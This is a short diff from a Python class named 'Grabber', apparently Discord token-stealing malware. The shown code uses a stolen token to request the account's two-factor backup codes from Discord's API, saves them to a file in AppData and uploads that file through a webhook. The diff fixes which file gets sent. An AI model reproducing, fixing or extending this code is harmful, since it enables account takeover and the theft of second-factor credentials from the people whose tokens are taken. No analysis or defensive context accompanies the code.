@@ -95,7 +95,7 @@ class Grabber:
                 r = self.session.post('https://discordapp.com/api/v6/users/@me/mfa/codes', headers=self.getHeaders(token), json=payload)
                 with open(f'{self.getAppData}\\Discord Data\\Backup.txt') as f:
                     f.write(r.json())
-                self.webHookFile(message="Some backup codes", file=f'{self.getAppData}\\Discord Data\\Logger.txt')    
+                self.webHookFile(message="Some backup codes", file=f'{self.getAppData}\\Discord Data\\Backup.txt')    
                 for i in range(10):
                     try:
                         backup = r.json()['backup_codes'][i]['code']
